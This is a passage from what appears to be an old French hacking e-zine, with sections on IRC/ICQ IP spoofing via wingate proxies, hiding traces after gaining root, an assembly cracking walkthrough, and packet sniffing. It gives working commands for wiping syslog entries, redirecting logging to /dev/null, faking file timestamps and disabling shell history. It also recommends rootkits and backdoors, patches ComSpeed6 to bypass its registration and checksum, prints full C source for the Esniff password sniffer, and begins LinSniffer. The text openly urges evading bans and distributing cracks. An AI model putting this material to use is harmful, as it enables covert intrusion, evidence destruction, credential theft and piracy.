-Le spoofing sous IRC: Oui, je sais, on ne peut pas vraiment parler de spoofing ici vu
que cette tecnique consiste en fait à utiliser un serveur proxy wingate pour prendre une
autre ip. On va donc chercher un serveur wingate, en faisant un scan de port sur le port
23, et on va tenter de se connecter :
> /serveur ip_wingate 23
Exemple :
> /server 80.9.32.58 23 

Mirc va alors vous écrire les commandes suivantes:                                                                                
>*** Connecting to 80.9.32.58 (23)                                                     
>Local host: KefKa (80.9.33.245)                                               
>ÿû ÿûÿýWinGate>NICK endrix 
>Connecting to host NICK...Host name lookup for 'NICK' failed 
>USER us1 "usmachine" "80.9.32.58" ident
>Connecting to host USER us1 usmachine"80.9.32.58" ...Host name lookup for ' USER 
>RhylKim "rhylmachine" "80.9.32.58" ' failed 

Une fois votre ip spoofée auprès d'irc il va falloir vous reconnecter car la précédente manip 
vous a déconnecté. et pour ça vous allez faire: 
/raw nom_du_serveur port_irc 

Par exemple :
> /raw irc.jeuxvideo.com 6666 

Mirc va alors vous écrire les commandes suivantes: 
>jeuxvideo.com rg "usmachine" "80.9.32.58" ...Host name lookup for ' >USER 
>us1 "usmachine" "80.9.32.58" ' failed 
>Connecting to host irc.jeuxvideo.com ...Connected 
Maintenant les formalités: 
votre nick: /nick votre_nick 
Dans notre exemple: /nick us1 
puis: 
>/user ident x x full_name 
Dans notre exemple:
> /user ident x x usmachine 

Voilà c'est bon votre adresse ip est spoofée sur mirc. Si quelqu'un fait un /dns ou un whois 
sur vous, c'est l'adresse ip spoofée qu'il verra et non le vôtre. Les modéros ne pourront donc 
plus vous bannir, libre à vous de faire ce que bon vous semble.

-Le spoofing sous ICQ:
Il existe de nombreux programmes pour spoofer son IP sur ICQ. Cependant, il existe une méthode 
simple, bien qu'elle ne marche pas à tous les coups. Pour commencer, prenez l'IP de quelqu'un, 
ouvrez ICQ, puis allez dans "préferences", "serveur" et changez le serveur qui est noté par icq.
mirabilis.com et laissez icq1.mirabilis.com.
Après ça reconnectez vous sur ICQ allez dans "security privacy" et enlevez le "do not IP publish". 
Vous serez ensuite spoofé...   :))

-L'IP spoofing:                                                                                               
Bon, là, c'est déjà plus compliqué...La mascarade d'adresse IP ou  ip spoofing permet a une 
machine du réseau extérieur de se faire passer pour une machine du réseau intérieur et ainsi 
de profiter de tous ses droits. 
L'attaquant donne a son ordinateur l'adresse IP d'une machine appartenant au réseau interne.
Donc, si vous voulez vous attaquez à un ordi dans un réseau protégé par un firewall, vous allez
devoir envoyez un paquet d'ip contenant une adresse IP d'un des postes du réseau. Le firewall 
va donc laisser passer le paquet ip car il reconnaîtra une adresse appartenant au réseau !!! 
Pour que vous puissiez être spoofé sur un réseau, va falloir créer sur le serveur un fichier *.rhost, 
je parlerais peut être des fichiers rhost dans un autre e-zine, patience...

Bon voilà, vous pourrez également trouver en télechargement sur le net des programmes 
permettant de vous spoofer, mais également des blooffers, des brouilleurs d'ip. 
Cependant ces derniers sont très facile à détourner, et pas franchement efficaces. 
Optez donc plutôt pour le spoofing.   :-)


²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 20°/Comment cacher son identité sur le net: l'après root ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
Prenons une situation simple. 
Vous venez d'obtenir l'accès root sur un serveur quelconque, et cet accès, si durement acquis,
vous aimeriez bien le garder afin que vous puissiez revenir quand bon vous semble, et cela 
sans que personne s'en aperçoive... 

Regardons donc la démarche à suivre, sous Linux:
La première chose que vous aurez à faire une fois votre shell root obtenu, c'est de modifier 
tous les logs du serveur qui pourraient aider l'administrateur à vous retrouver. Il existe 
trois types de logs, les syslogs, qui notent les messages envoyés au root par le systeme, 
le lastlog, et les historiques.

Commençons par les syslogs: Pour effacer vos traces dans le systeme, faites (ou nom_de_domaine, 
adresse_ip et nom doivent être remplacés par les données du serveur)

>sh-2.05$ cat /etc/syslog.conf
>sh-2.05$ cat log | grep -v nom_de_domaine | grep -v adresse_ip > nom
>sh-2.05$ cat nom > log
>sh-2.05$ rm nom

Voilà, nos traces sont effacées. 
On va maintenant rediriger les logs dans un endroit ou personne ne pourra les retrouver. 
D'abord, noter la date et l'heure du dernier changement de syslog.conf:

>sh-2.05$ cp/syslog.conf nom
>sh-2.05$ emacs syslog.conf

Ensuite on va tout rediriger dans /dev/null. Puis:
>sh-2.05$ killall -HUP syslogd

Maintenant on remet tout en place:
>sh-2.05$ mv nom syslog.conf
>sh-2.05$ touch -t yyyymmddhhmm.ss syslog.conf.
Et voilà. Ca, c'était pour les syslogs, maintenant:

Occupons nous du lastlog. Ce log enregistre la dernière connection de chaque utilisateur avec 
le port et l'adresse depuis lesquels il s'est connecté. Notre travail va consister à se 
relogger sur sa machine afin de faire disparaître la connection locale. Pour cela, faites:

>bash-2.05# rlogin root@localhost

Voilà c'est tout, pas trop dur mouarf... Maintenant:

On va s'occuper des historiques. Ces fichiers enregistrent toutes les actions que vous 
commandez avec votre minable shell root... Chaque shell possède un fichier d'historiques dans 
le répertoire de son utilisateur:

- sh: .sh_history
- csh: .history
- ksh: .sh_history
- bash: .bash_history
- zsh: .history
- tcsh: .history

Vous allez donc devoir en premier lieu, changer de shell pour effacer l'historique du shell 
précedent. Dans pratiquement tous les cas, votre shell sera sh. 

Maintenant regardons si le fichier .tcshrc existe, si oui, notons l'heure de sa dernière 
modification, puis faisons:

>sh-2.05$ mv .tcshrc.nom
>sh-2.05$ echo "set histfile=/dev/null" > .tcshrc
>sh-2.05$ tcsh

L'historique sera donc redirigée vers /dev/null. Il ne reste plus qu'à effacer du fichier .sh_history 
toutes les actions que l'on a faites depuis le début.

Puis, juste avant de partir, faites la manipulation inverse:
>root@hacked~>mv.nom.tcshrc (ou rm.tcshrc si vous venez de le créer)
>root@hacked~>touch -t yyyymmddhhmm.ss .tcshrc avec l'heure à laquelle il a été crée
>root@hacked~>logout

Voilà désormais, toutes les traces de votre passage sont effacées.

Maintenant vous allez devoir faire ce que l'on apelle une backdoor (=porte de derrière, un accès caché quoi) 
afin de revenir dès que vous le désirez.
Pour cela, il existe des rootkits, des backdoors déjà toutes preparées, à votre disposition sur la toile.      :))

Alors elle est pas belle la vie? 
Mais faites attention, c'est mauvais de revenir sur les lieux de son crime. 
Mieux vaut vous loggez sur un autre compte avant de revenir sur un serveur... Prenez garde !!!                :p



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 21°/La programmation, ce qu'il faut savoir maîtriser ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Bon, ce n'est un secret pour personne, mais le langage le plus important dans le hacking, 
c'est le C. 
Cependant, je ne vous conseille pas d'apprendre le C en premier si vous débutez. 
Il faut d'abord que vous assimiliez certaines notions de programmation et surtout que vous 
soyiez calé en math (nan je plaisante détendez vous :op)...
Alors par où commencer? Personnelement je vous dirais par le Visual Basic, du moins si vous 
connaisez déjà un peu le BASIC. 
Sinon, apprenez le delphi et aussi, très important, le HTML, bien que ce ne soit pas véritablement 
un langage de programmation, il est très utile pour faciliter l'apprentissage du C. 

Ensuite donc, apprenez le C. Puis vous passerez au C++ 
(malgrès la ressemblance ce sont des langages très différents vous verrez). 
Et puis après, essayez d'apprendre le Java, ce langage est très tourné vers l'avenir du hack, 
il vous sera sans doute bien utile dans les années à venir. 
Apprenez aussi quelques commandes DOS et linux (même si on peut pas trop parler de programmation dans ces deux cas).

Une chose également très importante, quelque soit le langage que vous apprenez, c'est le 
compilateur. C'est un outil qui vous permet de programmer, et de compiler votre programme, 
c'est à dire le rendre éxecutable. Cherchez en sur le Net. 
Pour ce qui est des cours de programmations, 
le mieux c'est d'apprendre dans les livres, pas dans les zines qui fatiguent trop la vue ou 
devant un enseignant qui fatigue trop les oreilles...
N'oubliez jamais, la programmation est l'essence même du bon hacker. 
Le stade ultime pour celui-ci, c'est d'apprendre un langage en seulement quelques jours. 

Une dernière chose, pour bien maîtriser un langage de programmation, il y'a deux choses essentielles: 
lire du code et écrire du code. 
Vous aurez beau connaître toutes les commandes possibles du C, vous ne pourrez jamais vous 
considerez comme un vrai programmeur tant que vous ferez pas vous même vos propres programmes. 

Voilà, j'espere m'être fait compris. 
On va tout de même rester dans la programmation avec le petit cours d'ASM qui va suivre...  :-> 



²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²
² 22°/Introduction au cracking, manipuler l'Assembleur (ASM) ²
²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²²

Le cracking consiste à faire sauter les protections d'un programme, afin de le diffuser 
gratuitement sur le net. 

Il existe deux méthodes pour cracker un programme:

* Live Approach: Cette méthode consiste à débugger le programme en lui posant des breack points
et en le tracant. On utilisera pour ce faire un debuggeur, comme par exemple SoftIce.

* Dead listing: Cette méthode nous interessera plus particulièrement car elle consiste à 
dessasembler un programme quelconque afin de modifier son shéma de protection. 
On utilisera un déssasembleur, W32Dasm est le plus adapté si vous avez Windows 9x.

Nous allons cracker ComSpeed6, comme il ne fait que 53ko, nous utiliserons le "Dead Listing".
Nous aurons besoin pour ce crack de W32Dasm6.

Lancez donc le desassembleur et ouvrez ComSpeed6. Cliquez sur "String Data reference" dans la 
barre d'outil. Vous allez obtenir entre autre:

>CodeFalse_
>CodeOk_
>Virus_      
    
Jetez un oeil sur CodeOk. W32Dasm vous envoie sur la routine qui commence à 
l'adresse 0011.0271. Juste après on trouve la procédure CodeFalse en 0011.02A4.
Voilà ce que ca donne:

>0011.0262 9AFFFF0000 call 0012.02E5h 
>0011.0267 08C0 or al , al 
>0011.0269 7433 je 029E                                                                           
>0011.026B FF76F0 push word ptr [bp+F0] 
>0011.026E FF76EE push word ptr [bp+EE] 
>* Possible StringData Ref from Data Seg 017 ->"CODEOK_%s"           
>0011.0271 BFF104 mov di, 04F1 
>0011.0274 1E push ds 

On y trouve un saut conditionnel, je029E qui nous enverra sur la procédure CodeFalse si le mot 
de passe est incorrect. 
On le change en jne:
>0011.0269 7533 jne 029E
Lancez maintanant ComSpeed6 avec un éditeur hexadécimal. Le programme nous dit:

>"The .exe file has been modified! That can be a Virus..."

Vous vous rappelez de Virus_? C'est un checksum, le programme additione les bytes et vérifie le résultat.

Nous avons changé un je (74) par un jne (75). Nous allons modifier les bytes qui suivent. 
Nous avions:
>0011.0269  7433   je   029E
Que nous avons changé en :
>0011.0269  7533   jne   029E
On va donc modifier le 33 qui suit. Cela nous donne:
>0011.0269  7532   jne   029E

Car 75+32=74+33. Le checksum est contourné.
Lancez maintenant ComSpeed6 et registrez vous avec n'importe quel mot de passe, ca marche.
Quittez ComSpeed6 et relancez le, il n'est plus enregistré.    :-(

Nous nous sommes juste débarassés de la procédure de vérification du mot de passe, 
le crack est loin d'être terminé.

Maintenant ouvrez ComSpeed.ini. On obtient:
>SwName=_Votre_Nom
>SwCode=_Votre_Mot_De_Passe

Vous savez donc comment le programme enregistre votre nom et votre mot de passe.

Revenons à notre W32Dasm6. Cliquez dans la barre à outil sur "Import Functions". 
Une liste de toutes les fonctions de Windows (les API) va s'afficher. 
Pour créer une barre de menu, un programme Windows doit appeller la fonction "User!DrawMenuBar. 
Cliquez sur elle pour visualiser les différents appels à celle-ci dans ComSpeed.

On trouve deux appels. Le deuxième est très intéressant:
 
>0001.1756 9AFFFF0000 call 0011.0122h 
>0001.175B 803ED00400 cmp byte ptr [04D0], 00 
>0001.1760 7531 jne 1793                                                                         
>0001.1762 FF363C0A push word ptr [0A3C] 
>0001.1766 FF363A0A push word ptr [0A3A] 
>0001.176A 9AFFFF0000 call 0006.0044h 
>0001.176F FF363407 push word ptr [0734] 
>0001.1773 6A02 push 0002 
>0001.1775 680004 push 0400 
>0001.1778 9AFFFF0000 call USER.DELETEMENU                             
>0001.177D FF760E push word ptr [bp+0E] 
>0001.1780 9AFFFF0000 call USER.DRAWMENUBAR 
>0001.1785 FF760E push word ptr [bp+0E] 
>0001.1788 6A00 push 0000 

On constate donc à l'adresse 0001.1778 l'appel à la procédure User!DeleteMenu qui va effacer la
barre de menu et tout de suite après, l'appel à User!DrawMenuBar qui va en créer un nouvelle sans le mot "shareware".

Encore un peu au dessus, on trouve un saut conditionnel, jne 1793, qui, si 04D0 est différent 
de zéro, nous fera sauter par dessus les deux fonctions User!DeleteMenu et User!DrawMenuBar.
On en déduit donc que, si "byte ptr [04D0]=0" , alors le programme est enregistré. 
"cmp byte ptr [04D0], 00" est présent dix fois dans le listing de ComSpeed6.

On va maintenant chercher l'instruction qui va écrire à l'adresse 04D0.


On en trouve qu'une seule:

>0011.0D27 9AFFFF0000 call 0012.02E5h 
>0011.0D2C 08C0 or al , al 
>0011.0D2E B000 mov al, 00 ; al:=0 
>0011.0D30 7501 jne 0D33                                                                              
>0011.0D32 40 inc ax ; al:=al+1 
>0011.0D33 A2D004 mov [04D0], al ; **ICI** 04D0=al 
>0011.0D36 803ED00400 cmp byte ptr [04D0], 00                                          
>0011.0D3B 7527 jne 0D64 
>0011.0D3D FF36D404 push word ptr [04D4] 
>0011.0D41 FF36D204 push word ptr [04D2] 
A cause du checksum, on ne peut pas se permettre de modifier le jne 0D64 en je 0D64.
On va donc plutôt intervertir les instructions.

Nous avions:
>0011.0D2E B000 mov al, 00 
>0011.0D30 7501 jne 0D33 
>0011.0D32 40 inc ax 
>0011.0D33 A2D004 mov [04D0], al 
>0011.0D36 803ED00400 cmp byte ptr [04D0], 00 
>0011.0D3B 7527 jne 0D64 
Que l'on peut changer en:
>0011.0D2E 7501 jne 0D31                                                                                                 
>0011.0D30 40 inc ax ; al:=al+1 
>0011.0D31 B000 mov al, 00 ; al:=0                                                                                           
>0011.0D33 A2D004 mov [04D0], al 
>0011.0D36 803ED00400 cmp byte ptr [04D0], 00 
>0011.0D3B 7527 jne 0D64 

Et voilà !!! Désormais "al=0" et l'instruction "mov [04D0], al" donnera la valeur zéro, 
donc "Registered, dans l'adresse 04D0.
Le résultat de "cmp byte ptr [04D0], 00" sera donc toujours vrai et ComSpeed6 ne s'en 
aperçevra pas. 
Il est maintenant enregistré.
Vous n'avez plus qu'à mettre votre crack en télechargement gratuit sur Internet... Voilà !!!
Cet exemple devrait vous aider par la suite pour cracker d'autres programmes de la même 
catégorie. 
Si vous voulez vraiment TOUT savoir sur l'ASM cherchez dans une librairie le bouquin 
"Assembleur Pratique", de B.Fabrot, il doit bien pouvoir se trouver quelque part.   :))



²²²²²²²²²²²²²²²²²²²²²²²²²
² 23°/L'art du sniffing ²
²²²²²²²²²²²²²²²²²²²²²²²²²

Pour sniffer, déjà, il faut que vous ayez un sniffer (lol). 
Un sniffer est un outil permettant d'intercepter des packet contenant des données, 
qui circulent sur un réseau.
Ces données sont bien entendus codées, et varient selon le filtrage de packets que vous 
utilisez, le protocole que vous sniffez. Voici maintenant une liste des sniffers les plus utilisés:

-Esniff, trouvable un peu partout sur le net. Voici son code source, à compiler en c :

/* Esniff.c */ 
#include <stdio.h> 
#include <ctype.h> 
#include <string.h> 
#include <sys/time.h> 
#include <sys/file.h> 
#include <sys/stropts.h> 
#include <sys/signal.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <sys/ioctl.h> 
#include <net/if.h> 
#include <net/nit_if.h> 
#include <net/nit_buf.h> 
#include <net/if_arp.h> 
#include <netinet/in.h> 
#include <netinet/if_ether.h> 
#include <netinet/in_systm.h> 
#include <netinet/ip.h> 
#include <netinet/udp.h> 
#include <netinet/ip_var.h> 
#include <netinet/udp_var.h> 
#include <netinet/in_systm.h> 
#include <netinet/tcp.h> 
#include <netinet/ip_icmp.h> 
#include <netdb.h> 
#include <arpa/inet.h> 
#define ERR stderr 
char *malloc(); 
char *device, 
*ProgName, 
*LogName; 
FILE *LOG; 
int debug=0; 
#define NIT_DEV "/dev/nit" 
#define CHUNKSIZE 4096 /* device buffer size */ 
int if_fd = -1; 
int Packet[CHUNKSIZE+32]; 
void Pexit(err,msg) 
int err; char *msg; 
{ perror(msg); 
exit(err); } 
void Zexit(err,msg) 
int err; char *msg; 
{ fprintf(ERR,msg); 
exit(err); } 
#define IP ((struct ip *)Packet) 
#define IP_OFFSET (0x1FFF) 
#define SZETH (sizeof(struct ether_header)) 
#define IPLEN (ntohs(ip->ip_len)) 
#define IPHLEN (ip->ip_hl) 
#define TCPOFF (tcph->th_off) 
#define IPS (ip->ip_src) 
#define IPD (ip->ip_dst) 
#define TCPS (tcph->th_sport) 
#define TCPD (tcph->th_dport) 
#define IPeq(s,t) ((s).s_addr == (t).s_addr) 
#define TCPFL(FLAGS) (tcph->th_flags & (FLAGS)) 
#define MAXBUFLEN (128) 
time_t LastTIME = 0; 
struct CREC { 
struct CREC *Next, 
*Last; 
time_t Time; /* start time */ 
struct in_addr SRCip, 
DSTip; 
u_int SRCport, /* src/dst ports */ 
DSTport; 
u_char Data[MAXBUFLEN+2]; /* important stuff :-) */ 
u_int Length; /* current data length */ 
u_int PKcnt; /* # pkts */ 
u_long LASTseq; 
}; 
struct CREC *CLroot = NULL; 
char *Symaddr(ip) 
register struct in_addr ip; 
{ register struct hostent *he = 
gethostbyaddr((char *)&ip.s_addr, sizeof(struct in_addr),AF_INET); 
return( (he)?(he->h_name):(inet_ntoa(ip)) ); 
} 
char *TCPflags(flgs) 
register u_char flgs; 
{ static char iobuf[8]; 
#define SFL(P,THF,C) iobuf[P]=((flgs & THF)?C:'-') 
SFL(0,TH_FIN, 'F'); 
SFL(1,TH_SYN, 'S'); 
SFL(2,TH_RST, 'R'); 
SFL(3,TH_PUSH,'P'); 
SFL(4,TH_ACK, 'A'); 
SFL(5,TH_URG, 'U'); 
iobuf[6]=0; 
return(iobuf); 
} 
char *SERVp(port) 
register u_int port; 
{ static char buf[10]; 
register char *p; 
switch(port) { 
case IPPORT_LOGINSERVER: p="rlogin"; break; 
case IPPORT_TELNET: p="telnet"; break; 
case IPPORT_SMTP: p="smtp"; break; 
default: sprintf(buf,"%u",port); p=buf; break; 
} 
return(p); 
} 
char *Ptm(t) 
register time_t *t; 
{ register char *p = ctime(t); 
p[strlen(p)-6]=0; /* strip " YYYY\n" */ 
return(p); 
} 
char *NOWtm() 
{ time_t tm; 
time(&tm); 
return( Ptm(&tm) ); 
} 
#define MAX(a,b) (((a)>(b))?(a):(b)) 
#define MIN(a,b) (((a)<(b))?(a):(b)) 
/* add an item */ 
#define ADD_NODE(SIP,DIP,SPORT,DPORT,DATA,LEN) { \ 
register struct CREC *CLtmp = \ 
(struct CREC *)malloc(sizeof(struct CREC)); \ 
time( &(CLtmp->Time) ); \ 
CLtmp->SRCip.s_addr = SIP.s_addr; \ 
CLtmp->DSTip.s_addr = DIP.s_addr; \ 
CLtmp->SRCport = SPORT; \ 
CLtmp->DSTport = DPORT; \ 
CLtmp->Length = MIN(LEN,MAXBUFLEN); \ 
bcopy( (u_char *)DATA, (u_char *)CLtmp->Data, CLtmp->Length); \ 
CLtmp->PKcnt = 1; \ 
CLtmp->Next = CLroot; \ 
CLtmp->Last = NULL; \ 
CLroot = CLtmp; \ 
} 
register struct CREC *GET_NODE(Sip,SP,Dip,DP) 
register struct in_addr Sip,Dip; 
register u_int SP,DP; 
{ register struct CREC *CLr = CLroot; 
while(CLr != NULL) { 
if( (CLr->SRCport == SP) && (CLr->DSTport == DP) && 
IPeq(CLr->SRCip,Sip) && IPeq(CLr->DSTip,Dip) ) 
break; 
CLr = CLr->Next; 
} 
return(CLr); 
} 
#define ADDDATA_NODE(CL,DATA,LEN) { \ 
bcopy((u_char *)DATA, (u_char *)&CL->Data[CL->Length],LEN); \ 
CL->Length += LEN; \ 
} 
#define PR_DATA(dp,ln) { \ 
register u_char lastc=0; \ 
while(ln-- >0) { \ 
if(*dp < 32) { \ 
switch(*dp) { \ 
case '\0': if((lastc=='\r') || (lastc=='\n') || lastc=='\0') \ 
break; \ 
case '\r': \ 
case '\n': fprintf(LOG,"\n : "); \ 
break; \ 
default : fprintf(LOG,"^%c", (*dp + 64)); \ 
break; \ 
} \ 
} else { \ 
if(isprint(*dp)) fputc(*dp,LOG); \ 
else fprintf(LOG,"(%d)",*dp); \ 
} \ 
lastc = *dp++; \ 
} \ 
fflush(LOG); \ 
} 
void END_NODE(CLe,d,dl,msg) 
register struct CREC *CLe; 
register u_char *d; 
register int dl; 
register char *msg; 
{ 
fprintf(LOG,"\n-- TCP/IP LOG -- TM: %s --\n", Ptm(&CLe->Time)); 
fprintf(LOG," PATH: %s(%s) =>", Symaddr(CLe->SRCip),SERVp(CLe->SRCport)); 
fprintf(LOG," %s(%s)\n", Symaddr(CLe->DSTip),SERVp(CLe->DSTport)); 
fprintf(LOG," STAT: %s, %d pkts, %d bytes [%s]\n", 
NOWtm(),CLe->PKcnt,(CLe->Length+dl),msg); 
fprintf(LOG," DATA: "); 
{ register u_int i = CLe->Length; 
register u_char *p = CLe->Data; 
PR_DATA(p,i); 
PR_DATA(d,dl); 
} 
fprintf(LOG,"\n-- \n"); 
fflush(LOG); 
if(CLe->Next != NULL) 
CLe->Next->Last = CLe->Last; 
if(CLe->Last != NULL) 
CLe->Last->Next = CLe->Next; 
else 
CLroot = CLe->Next; 
free(CLe); 
} 
/* 30 mins (x 60 seconds) */ 
#define IDLE_TIMEOUT 1800 
#define IDLE_NODE() { \ 
time_t tm; \ 
time(&tm); \ 
if(LastTIME<tm) { \ 
register struct CREC *CLe,*CLt = CLroot; \ 
LastTIME=(tm+IDLE_TIMEOUT); tm-=IDLE_TIMEOUT; \ 
while(CLe=CLt) { \ 
CLt=CLe->Next; \ 
if(CLe->Time <tm) \ 
END_NODE(CLe,(u_char *)NULL,0,"IDLE TIMEOUT"); \ 
} \ 
} \ 
} 
void filter(cp, pktlen) 
register char *cp; 
register u_int pktlen; 
{ 
register struct ip *ip; 
register struct tcphdr *tcph; 
{ register u_short EtherType=ntohs(((struct ether_header *)cp)->ether_type); 
if(EtherType < 0x600) { 
EtherType = *(u_short *)(cp + SZETH + 6); 
cp+=8; pktlen-=8; 
} 
if(EtherType != ETHERTYPE_IP) /* chuk it if its not IP */ 
return; 
} 
/* ugh, gotta do an alignment :-( */ 
bcopy(cp + SZETH, (char *)Packet,(int)(pktlen - SZETH)); 
ip = (struct ip *)Packet; 
if( ip->ip_p != IPPROTO_TCP) /* chuk non tcp pkts */ 
return; 
tcph = (struct tcphdr *)(Packet + IPHLEN); 
if(!( (TCPD == IPPORT_TELNET) || 
(TCPD == IPPORT_LOGINSERVER) || 
)) return; 
{ register struct CREC *CLm; 
register int length = ((IPLEN - (IPHLEN * 4)) - (TCPOFF * 4)); 
register u_char *p = (u_char *)Packet; 
p += ((IPHLEN * 4) + (TCPOFF * 4)); 
if(debug) { 
fprintf(LOG,"PKT: (%s %04X) ", TCPflags(tcph->th_flags),length); 
fprintf(LOG,"%s[%s] => ", inet_ntoa(IPS),SERVp(TCPS)); 
fprintf(LOG,"%s[%s]\n", inet_ntoa(IPD),SERVp(TCPD)); 
} 
if( CLm = GET_NODE(IPS, TCPS, IPD, TCPD) ) { 
CLm->PKcnt++; 
if(length>0) 
if( (CLm->Length + length) < MAXBUFLEN ) { 
ADDDATA_NODE( CLm, p,length); 
} else { 
END_NODE( CLm, p,length, "DATA LIMIT"); 
} 
if(TCPFL(TH_FIN|TH_RST)) { 
END_NODE( CLm, (u_char *)NULL,0,TCPFL(TH_FIN)?"TH_FIN":"TH_RST" ); 
} 
} else { 
if(TCPFL(TH_SYN)) { 
ADD_NODE(IPS,IPD,TCPS,TCPD,p,length); 
} 
} 
IDLE_NODE(); 
} 
} 
/* signal handler 
*/ 
void death() 
{ register struct CREC *CLe; 
while(CLe=CLroot) 
END_NODE( CLe, (u_char *)NULL,0, "SIGNAL"); 
fprintf(LOG,"\nLog ended at => %s\n",NOWtm()); 
fflush(LOG); 
if(LOG != stdout) 
fclose(LOG); 
exit(1); 
} 
/* opens network interface, performs ioctls and reads from it, 
* passing data to filter function 
*/ 
void do_it() 
{ 
int cc; 
char *buf; 
u_short sp_ts_len; 
if(!(buf=malloc(CHUNKSIZE))) 
Pexit(1,"Eth: malloc"); 
/* this /dev/nit initialization code pinched from etherfind */ 
{ 
struct strioctl si; 
struct ifreq ifr; 
struct timeval timeout; 
u_int chunksize = CHUNKSIZE; 
u_long if_flags = NI_PROMISC; 
if((if_fd = open(NIT_DEV, O_RDONLY)) < 0) 
Pexit(1,"Eth: nit open"); 
if(ioctl(if_fd, I_SRDOPT, (char *)RMSGD) < 0) 
Pexit(1,"Eth: ioctl (I_SRDOPT)"); 
si.ic_timout = INFTIM; 
if(ioctl(if_fd, I_PUSH, "nbuf") < 0) 
Pexit(1,"Eth: ioctl (I_PUSH \"nbuf\")"); 
timeout.tv_sec = 1; 
timeout.tv_usec = 0; 
si.ic_cmd = NIOCSTIME; 
si.ic_len = sizeof(timeout); 
si.ic_dp = (char *)&timeout; 
if(ioctl(if_fd, I_STR, (char *)&si) < 0) 
Pexit(1,"Eth: ioctl (I_STR: NIOCSTIME)"); 
si.ic_cmd = NIOCSCHUNK; 
si.ic_len = sizeof(chunksize); 
si.ic_dp = (char *)&chunksize; 
if(ioctl(if_fd, I_STR, (char *)&si) < 0) 
Pexit(1,"Eth: ioctl (I_STR: NIOCSCHUNK)"); 
strncpy(ifr.ifr_name, device, sizeof(ifr.ifr_name)); 
ifr.ifr_name[sizeof(ifr.ifr_name) - 1] = '\0'; 
si.ic_cmd = NIOCBIND; 
si.ic_len = sizeof(ifr); 
si.ic_dp = (char *)&ifr; 
if(ioctl(if_fd, I_STR, (char *)&si) < 0) 
Pexit(1,"Eth: ioctl (I_STR: NIOCBIND)"); 
si.ic_cmd = NIOCSFLAGS; 
si.ic_len = sizeof(if_flags); 
si.ic_dp = (char *)&if_flags; 
if(ioctl(if_fd, I_STR, (char *)&si) < 0) 
Pexit(1,"Eth: ioctl (I_STR: NIOCSFLAGS)"); 
if(ioctl(if_fd, I_FLUSH, (char *)FLUSHR) < 0) 
Pexit(1,"Eth: ioctl (I_FLUSH)"); 
} 
while ((cc = read(if_fd, buf, CHUNKSIZE)) >= 0) { 
register char *bp = buf, 
*bufstop = (buf + cc); 
while (bp < bufstop) { 
register char *cp = bp; 
register struct nit_bufhdr *hdrp; 
hdrp = (struct nit_bufhdr *)cp; 
cp += sizeof(struct nit_bufhdr); 
bp += hdrp->nhb_totlen; 
filter(cp, (u_long)hdrp->nhb_msglen); 
} 
} 
Pexit((-1),"Eth: read"); 
} 
/* Authorize your proogie,generate your own password and uncomment here */ 
/* #define AUTHPASSWD "EloiZgZejWyms" */ 
void getauth() 
{ char *buf,*getpass(),*crypt(); 
char pwd[21],prmpt[81]; 
strcpy(pwd,AUTHPASSWD); 
sprintf(prmpt,"(%s)UP? ",ProgName); 
buf=getpass(prmpt); 
if(strcmp(pwd,crypt(buf,pwd))) 
exit(1); 
} 
*/ 
void main(argc, argv) 
int argc; 
char **argv; 
{ 
char cbuf[BUFSIZ]; 
struct ifconf ifc; 
int s, 
ac=1, 
backg=0; 
ProgName=argv[0]; 
/* getauth(); */ 
LOG=NULL; 
device=NULL; 
while((ac<argc) && (argv[ac][0] == '-')) { 
register char ch = argv[ac++][1]; 
switch(toupper(ch)) { 
case 'I': device=argv[ac++]; 
break; 
case 'F': if(!(LOG=fopen((LogName=argv[ac++]),"a"))) 
Zexit(1,"Output file cant be opened\n"); 
break; 
case 'B': backg=1; 
break; 
case 'D': debug=1; 
break; 
default : fprintf(ERR, 
"Usage: %s [-b] [-d] [-i interface] [-f file]\n", 
ProgName); 
exit(1); 
} 
} 
if(!device) { 
if((s=socket(AF_INET, SOCK_DGRAM, 0)) < 0) 
Pexit(1,"Eth: socket"); 
ifc.ifc_len = sizeof(cbuf); 
ifc.ifc_buf = cbuf; 
if(ioctl(s, SIOCGIFCONF, (char *)&ifc) < 0) 
Pexit(1,"Eth: ioctl"); 
close(s); 
device = ifc.ifc_req->ifr_name; 
} 
fprintf(ERR,"Using logical device %s [%s]\n",device,NIT_DEV); 
fprintf(ERR,"Output to %s.%s%s",(LOG)?LogName:"stdout", 
(debug)?" (debug)":"",(backg)?" Backgrounding ":"\n"); 
if(!LOG) 
LOG=stdout; 
signal(SIGINT, death); 
signal(SIGTERM,death); 
signal(SIGKILL,death); 
signal(SIGQUIT,death); 
if(backg && debug) { 
fprintf(ERR,"[Cannot bg with debug on]\n"); 
backg=0; 
} 
if(backg) { 
register int s; 
if((s=fork())>0) { 
fprintf(ERR,"[pid %d]\n",s); 
exit(0); 
} else if(s<0) 
Pexit(1,"fork"); 
if( (s=open("/dev/tty",O_RDWR))>0 ) { 
ioctl(s,TIOCNOTTY,(char *)NULL); 
close(s); 
} 
} 
fprintf(LOG,"\nLog started at => %s [pid %d]\n",NOWtm(),getpid()); 
fflush(LOG); 
do_it(); 
} 

-Spynet , sans doute un des meilleurs, mais il est pas gratuit cui ci, faut le payer hein....  :p

-ATM Sniffer Network Analyser , le meilleur de tous, qui décode plus de 250 protocoles... 
Disponible sur http://www.networkassociates.com.

-EtherPeek , disponible sur http://www.aggroup.com , pour Win et Mac.

-Linsniff , un bon sniffer de mot de passe. Voilà son code source, en c:

/* 
LinSniffer 0.02 [BETA] 
Mike Edulla 
medulla@infosoc.com 
DO NOT REDISTRIBUTE 
*/ 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <sys/time.h> 
#include <netinet/in.h> 
#include <netdb.h> 
#include <string.h> 
#include <linux/if.h> 
#include <signal.h> 
#include <stdio.h> 
#include <arpa/inet.h> 
#include <linux/socket.h> 
#include <linux/ip.h> 
